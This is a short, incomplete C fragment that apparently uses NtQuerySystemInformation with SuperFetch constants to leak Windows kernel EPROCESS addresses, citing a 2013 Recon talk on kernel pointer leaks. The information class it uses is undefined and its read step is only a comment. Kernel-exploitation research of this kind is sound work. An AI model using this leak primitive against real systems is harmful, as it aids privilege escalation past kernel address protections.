#define PREFETCH_VERSION 0x0000002d
#define PREFETCH_SECRET 0x6b756843

#define QUERY_PRIV_PRIV_SOURCE 0x00000008
#define PRIV_SOURCE_SIZE 0x00002590

void getEprocessFromPrefetchSource()
{
	ULONG len = 0;
	int i = 0;
	NTSTATUS st = 0;
	PINT32 leak = (PINT32)malloc(0x4242);
	PINT64 data = (PINT64)malloc(0x4242);
	memset(leak, 'A', 0x4242);
	memset(data, 'B', 0x4242);
	leak[0] = PREFETCH_VERSION; 
	leak[1] = PREFETCH_SECRET;  
	leak[2] = QUERY_PRIV_PRIV_SOURCE;
	leak[3] = 0;
	leak[4] = (int)data & 0xffffffff; 
	leak[5] = ((INT64)data & 0xffffffff00000000) >> 32; 
	leak[6] = PRIV_SOURCE_SIZE;
	data[0] = 0x0000000006;
	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)PRE, leak, 0x20, &len);
	// read data
}

//http://recon.cx/2013/slides/Recon2013-Alex%20Ionescu-I%20got%2099%20problems%20but%20a%20kernel%20pointer%20ain't%20one.pdf
